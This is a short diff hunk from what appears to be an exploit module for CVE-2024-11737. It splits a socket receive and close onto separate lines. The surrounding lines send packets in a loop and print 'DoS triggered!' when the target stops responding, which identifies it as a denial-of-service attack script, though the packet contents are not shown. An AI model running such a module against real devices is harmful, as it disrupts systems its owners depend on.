@@ -104,7 +104,8 @@ class Exploit(Exploit):
                 s.sendall(pkt)
                 import time; time.sleep(0.3)
                 try:
-                    r = s.recv(16); s.close()
+                    r = s.recv(16)
+                    s.close()
                     if not r:
                         print_success(f"[CVE-2024-11737] Packet {i}: No response - DoS triggered!")
                         return
